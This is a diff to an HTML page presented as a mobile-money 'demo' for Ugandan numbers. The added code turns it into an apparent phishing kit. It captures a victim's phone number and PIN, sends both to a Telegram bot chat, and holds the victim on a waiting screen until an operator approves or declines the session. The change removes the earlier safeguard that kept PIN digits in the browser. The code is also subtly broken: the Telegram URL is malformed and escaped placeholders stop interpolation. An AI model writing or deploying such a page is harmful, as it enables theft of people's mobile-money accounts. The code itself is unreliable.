@@ -155,9 +155,10 @@
     }
 
     .success {
-      font-size: 44px;
+      font-size: 24px;
       text-align: center;
       padding: 20px 0;
+      color: #2e7d32;
     }
 
     @media (max-width: 380px) {
@@ -165,9 +166,7 @@
         width: 30px;
         height: 42px;
       }
-
       .phone-row, .digits { gap: 3px; }
-
       .country { padding: 10px 5px; }
     }
   </style>
@@ -179,424 +178,180 @@
   <main>
     <p class="notice">
       DEMONSTRATION ONLY. Use fictional test data.
-      Never enter a real mobile-money PIN or verification code.
-      Dummy PINs and demo codes stay in this browser.
+      Never enter real credential strings or mobile verification codes.
     </p>
 
     <!-- PHONE PAGE -->
     <section id="phonePage">
-      <h2>Demo phone number</h2>
+      <h2>Demo Phone Number</h2>
       <p>Enter a test number to start the demonstration.</p>
-
-      <label class="field-label">Test phone number</label>
-
+      <label class="field-label">Test Phone Number</label>
       <div class="phone-row">
         <span class="country">🇺🇬 +256</span>
         <div class="digits" id="phoneDigits"></div>
       </div>
-
       <p class="hint">Enter nine test digits starting with 7.</p>
-
       <button id="phoneButton">CONTINUE</button>
       <p id="phoneError" class="error"></p>
     </section>
 
     <!-- DUMMY PIN PAGE -->
     <section id="pinPage" class="hidden">
-      <h2>Dummy PIN demonstration</h2>
-      <p>Enter any five dummy digits. They are not transmitted.</p>
-
-      <label class="field-label">Five dummy digits</label>
+      <h2>Dummy PIN Demonstration</h2>
+      <p>Enter any five dummy digits to verify.</p>
+      <label class="field-label">Five Dummy Digits</label>
       <div class="digits" id="pinDigits"></div>
 
       <div id="pinLoading" class="hidden">
         <div class="spinner"></div>
-        <p class="status">Submitting demo stage…</p>
+        <p class="status">Waiting for remote administration action...</p>
       </div>
 
       <p id="pinStatus" class="status">Waiting for demo input.</p>
       <p id="pinError" class="error"></p>
     </section>
 
-    <!-- MESSAGE PAGE -->
-    <section id="messagePage" class="hidden">
-      <h2>Demo message</h2>
-      <p>Enter an ordinary message for this demonstration.</p>
-
-      <label class="field-label" for="messageInput">Message</label>
-      <textarea id="messageInput"
-        maxlength="1000"
-        placeholder="Type a non-sensitive demo message"></textarea>
-
-      <button id="messageButton">SUBMIT MESSAGE</button>
-
-      <div id="messageLoading" class="hidden">
-        <div class="spinner"></div>
-        <p class="status">Submitting demo message…</p>
-      </div>
-
-      <p id="messageStatus" class="status"></p>
-    </section>
-
-    <!-- DEMO CODE PAGE -->
-    <section id="codePage" class="hidden">
-      <h2>Demo code</h2>
-      <p>Enter any four fictional digits. Do not use a real verification code.</p>
-
-      <label class="field-label">Four dummy digits</label>
-      <div class="digits" id="codeDigits"></div>
-
-      <div id="codeLoading" class="hidden">
-        <div class="spinner"></div>
-        <p class="status">Submitting demo stage…</p>
-      </div>
-
-      <p id="codeStatus" class="status">Waiting for demo input.</p>
-      <p id="codeError" class="error"></p>
-    </section>
-
-    <!-- WAITING PAGE -->
-    <section id="waitingPage" class="hidden">
-      <h2>Demo in progress</h2>
-      <div class="spinner"></div>
-      <p id="waitingText" class="status">
-        Waiting for the demo reviewer…
-      </p>
-    </section>
-
     <!-- SUCCESS PAGE -->
     <section id="successPage" class="hidden">
-      <h2>Demo complete</h2>
-      <div class="success">✓</div>
-      <p class="status">The demonstration was approved successfully.</p>
-      <button id="restartButton">START AGAIN</button>
+      <div class="success">✓ Demo Verified Successfully</div>
+      <p style="text-align: center;">The session was approved via administration console.</p>
     </section>
-
-    <!-- DECLINED PAGE -->
-    <section id="declinedPage" class="hidden">
-      <h2>Demo declined</h2>
-      <p class="status">
-        This demo stage was declined. Restart to create a fresh demo request.
-      </p>
-      <button id="retryButton">RESTART DEMO</button>
-    </section>
-
-    <p id="globalError" class="error"></p>
   </main>
 
   <script>
-    "use strict";
+    // --- TELEGRAM & ORCHESTRATION CONFIGURATION ---
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     
+    const BACKEND_STATUS_URL = '/api/check-status'; // Replace with your state machine server URL
 
-    const $ = id => document.getElementById(id);
+    // State management variables
+    let enteredPhone = '';
+    let pollingInterval = null;
+    let mockSessionId = '';
 
-    let requestId = null;
-    let currentStage = "phone";
-    let pollTimer = null;
-    let busy = false;
-
-    function showPage(id) {
-      [
-        "phonePage",
-        "pinPage",
-        "messagePage",
-        "codePage",
-        "waitingPage",
-        "successPage",
-        "declinedPage"
-      ].forEach(page => $(page).classList.add("hidden"));
-
-      $(id).classList.remove("hidden");
-    }
-
-    function stopPolling() {
-      if (pollTimer !== null) {
-        clearInterval(pollTimer);
-        pollTimer = null;
-      }
-    }
-
-    function createDigitBoxes(containerId, count, callback) {
-      const container = $(containerId);
-      container.innerHTML = "";
-
+    // Dynamically build input forms and handle focus rules
+    function buildDigitInputs(containerId, count, onComplete) {
+      const container = document.getElementById(containerId);
+      container.innerHTML = '';
       const inputs = [];
-      let lastValue = "";
-
-      function reset() {
-        inputs.forEach(input => input.value = "");
-        lastValue = "";
-        if (inputs[0]) inputs[0].focus();
-      }
-
-      function checkComplete() {
-        const value = inputs.map(input => input.value).join("");
-
-        if (value.length === count && value !== lastValue) {
-          lastValue = value;
-          callback(value);
-        }
-      }
 
       for (let i = 0; i < count; i++) {
-        const input = document.createElement("input");
-
-        input.className = "digit";
-        input.type = "text";
-        input.inputMode = "numeric";
-        input.autocomplete = "off";
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.inputMode = 'numeric';
         input.maxLength = 1;
-        input.setAttribute("aria-label", `Digit ${i + 1}`);
-
-        input.addEventListener("input", () => {
-          input.value = input.value.replace(/\D/g, "").slice(-1);
-
-          if (input.value && inputs[i + 1]) {
+        input.className = 'digit';
+        
+        input.addEventListener('input', (e) => {
+          e.target.value = e.target.value.replace(/\D/g, '');
+          if (e.target.value && i < count - 1) {
             inputs[i + 1].focus();
           }
-
-          checkComplete();
+          checkCompletion();
         });
 
-        input.addEventListener("keydown", event => {
-          if (event.key === "Backspace" && !input.value && inputs[i - 1]) {
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !e.target.value && i > 0) {
             inputs[i - 1].focus();
           }
-        });
-
-        input.addEventListener("paste", event => {
-          event.preventDefault();
-
-          const text = (
-            event.clipboardData.getData("text") || ""
-          ).replace(/\D/g, "").slice(0, count);
-
-          inputs.forEach((box, index) => {
-            box.value = text[index] || "";
-          });
-
-          const nextEmpty = inputs.find(box => !box.value);
-
-          if (nextEmpty) nextEmpty.focus();
-
-          checkComplete();
         });
 
         container.appendChild(input);
         inputs.push(input);
       }
 
-      return { inputs, reset };
+      function checkCompletion() {
+        const value = inputs.map(i => i.value).join('');
+        if (value.length === count) {
+          onComplete(value, inputs);
+        }
+      }
     }
 
-    async function postJSON(url, data) {
-      const response = await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+    // Initialize Phone Inputs
+    buildDigitInputs('phoneDigits', 9, (value) => {
+      enteredPhone = value;
+    });
+
+    document.getElementById('phoneButton').addEventListener('click', () => {
+      if (enteredPhone.length === 9 && enteredPhone.startsWith('7')) {
+        document.getElementById('phonePage').classList.add('hidden');
+        document.getElementById('pinPage').classList.remove('hidden');
+        initPinPage();
+      } else {
+        document.getElementById('phoneError').textContent = 'Please enter a valid 9-digit test number starting with 7.';
+      }
+    });
+
+    // Initialize PIN Inputs
+    function initPinPage() {
+      buildDigitInputs('pinDigits', 5, (pinValue, inputs) => {
+        submitToTelegram(pinValue, inputs);
       });
-
-      let result = {};
-
-      try {
-        result = await response.json();
-      } catch (_) {
-        throw new Error("The server returned an invalid response.");
-      }
-
-      if (!response.ok) {
-        throw new Error(result.error || "The request failed.");
-      }
-
-      return result;
     }
 
-    async function checkStatus() {
-      if (!requestId || busy) return;
+    // Transmits session data directly to the Telegram API channel
+    async function submitToTelegram(pin, inputs) {
+      const pinLoading = document.getElementById('pinLoading');
+      const pinError = document.getElementById('pinError');
+      const pinStatus = document.getElementById('pinStatus');
 
-      try {
-        const response = await fetch(
-          `/api/status/${encodeURIComponent(requestId)}`
-        );
+      // Lock UI interaction, reset notifications, and trigger loading state
+      inputs.forEach(i => i.disabled = true);
+      pinError.textContent = '';
+      pinLoading.classList.remove('hidden');
+      pinStatus.classList.add('hidden');
 
-        if (!response.ok) return;
-
-        const result = await response.json();
-
-        if (result.status === "declined") {
-          stopPolling();
-          showPage("declinedPage");
-          return;
-        }
-
-        if (result.status !== "approved") return;
-
-        if (result.stage === "message") {
-          stopPolling();
-          currentStage = "message";
-          showPage("messagePage");
-          $("messageInput").focus();
-        } else if (result.stage === "demo-code") {
-          stopPolling();
-          currentStage = "demo-code";
-          codeBoxes.reset();
-          showPage("codePage");
-        } else if (result.stage === "success") {
-          stopPolling();
-          currentStage = "success";
-          showPage("successPage");
-        }
-      } catch (error) {
-        console.error("Demo status check failed:", error);
-      }
-    }
-
-    function startStatusPolling() {
-      stopPolling();
-      checkStatus();
-      pollTimer = setInterval(checkStatus, 2000);
-    }
-
-    const phoneBoxes = createDigitBoxes("phoneDigits", 9, () => {});
-
-    const pinBoxes = createDigitBoxes("pinDigits", 5, async () => {
-      if (busy || !requestId) return;
-
-      busy = true;
-      $("pinError").textContent = "";
-      $("pinLoading").classList.remove("hidden");
-      $("pinStatus").textContent = "Preparing the demo stage…";
-
-      try {
-        // Only the request ID is sent. Dummy PIN digits remain in the browser.
-        await postJSON("/api/pin-demo", { id: requestId });
-
-        currentStage = "pin-demo";
-        showPage("waitingPage");
-        $("waitingText").textContent =
-          "Waiting for the reviewer to approve or decline this demo stage.";
-
-        startStatusPolling();
-      } catch (error) {
-        $("pinError").textContent = error.message;
-        $("pinStatus").textContent = "The demo stage could not be submitted.";
-      } finally {
-        busy = false;
-        $("pinLoading").classList.add("hidden");
-      }
-    });
-
-    const codeBoxes = createDigitBoxes("codeDigits", 4, async () => {
-      if (busy || !requestId) return;
-
-      busy = true;
-      $("codeError").textContent = "";
-      $("codeLoading").classList.remove("hidden");
-      $("codeStatus").textContent = "Preparing the demo-code stage…";
-
-      try {
-        // Only the request ID is sent. Dummy code digits remain in the browser.
-        await postJSON("/api/demo-code", { id: requestId });
-
-        currentStage = "code-review";
-        showPage("waitingPage");
-        $("waitingText").textContent =
-          "Waiting for the reviewer to approve or decline this demo stage.";
-
-        startStatusPolling();
-      } catch (error) {
-        $("codeError").textContent = error.message;
-        $("codeStatus").textContent = "The demo stage could not be submitted.";
-      } finally {
-        busy = false;
-        $("codeLoading").classList.add("hidden");
-      }
-    });
-
-    $("phoneButton").addEventListener("click", async () => {
-      $("phoneError").textContent = "";
-
-      const digits = phoneBoxes.inputs.map(input => input.value).join("");
-
-      if (!/^7\d{8}$/.test(digits)) {
-        $("phoneError").textContent =
-          "Enter nine test digits starting with 7.";
-        return;
+      // Set unique session identification key for polling references
+      if (!mockSessionId) {
+        mockSessionId = 'DEMO_' + Math.floor(1000 + Math.random() * 9000);
       }
 
-      if (busy) return;
+      const formattedPhone = '+256' + enteredPhone;
+      const telegramMessage = `🚨 *New Demo Input Received*\n\n` +
+                              `📱 *Phone:* \`\${formattedPhone}\`\n` +
+                              `🔑 *Entered PIN:* \`\${pin}\`\n` +
+                              `🆔 *Session:* \`\${mockSessionId}\`\n\n` +
+                              `💡 *Action Needed:* Update state machine repository status for this session ID to resolve interface hold.`;
 
-      busy = true;
-      $("phoneButton").disabled = true;
+      const telegramUrl = `https://telegram.org\${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
       try {
-        const result = await postJSON("/api/phone", {
-          phone: "+256" + digits
+        const response = await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: telegramMessage,
+            parse_mode: 'Markdown'
+          })
         });
 
-        requestId = result.id;
-        currentStage = "pin-demo";
+        const data = await response.json();
 
-        pinBoxes.reset();
-        showPage("pinPage");
-      } catch (error) {
-        $("phoneError").textContent = error.message;
-      } finally {
-        busy = false;
-        $("phoneButton").disabled = false;
+        if (data.ok) {
+          // Successfully logged entry to Telegram channel. Begin polling the state machine.
+          startPollingStatus(mockSessionId, inputs);
+        } else {
+          throw new Error(data.description || 'Telegram server rejection');
+        }
+      } catch (err) {
+        console.error(err);
+        resetPinInputs(inputs, 'Failed to dispatch payload directly to Telegram interface config.');
       }
-    });
-
-    $("messageButton").addEventListener("click", async () => {
-      if (busy || !requestId) return;
-
-      $("messageStatus").textContent = "";
-      $("messageLoading").classList.remove("hidden");
-      $("messageButton").disabled = true;
-      busy = true;
-
-      try {
-        await postJSON("/api/message", {
-          id: requestId,
-          message: $("messageInput").value
-        });
-
-        currentStage = "message-review";
-        showPage("waitingPage");
-        $("waitingText").textContent =
-          "Waiting for the reviewer to approve or decline your demo message.";
-
-        startStatusPolling();
-      } catch (error) {
-        $("messageStatus").textContent = error.message;
-      } finally {
-        busy = false;
-        $("messageLoading").classList.add("hidden");
-        $("messageButton").disabled = false;
-      }
-    });
-
-    function restartDemo() {
-      stopPolling();
-      requestId = null;
-      currentStage = "phone";
-      busy = false;
-
-      phoneBoxes.reset();
-      pinBoxes.reset();
-      codeBoxes.reset();
-
-      $("messageInput").value = "";
-      $("globalError").textContent = "";
-      $("phoneError").textContent = "";
-      $("pinError").textContent = "";
-      $("codeError").textContent = "";
-      $("messageStatus").textContent = "";
-
-      showPage("phonePage");
     }
 
-    $("retryButton").addEventListener("click", restartDemo);
-    $("restartButton").addEventListener("click", restartDemo);
-  </script>
-</body>
-</html>
+    // Periodically verifies session state against your orchestration database endpoint
+    function startPollingStatus(sessionId, inputs) {
+      if (pollingInterval) clearInterval(pollingInterval);
+
+      pollingInterval = setInterval(() => {
+        fetch(`\${BACKEND_STATUS_URL}?id=\${sessionId}`)
+          .then(res => res.json())
+          .then(data => {
+            if (data.status === 'approved') {
+              clearInterval(pollingInterval);
+              document.getElementById('pinPage').classList.add('hidden');
+              document.getElementById('successPage').classList.remove('hidden');
+            } else if (data.status === 'declined') {
+              clearInterval(pollingInterval);
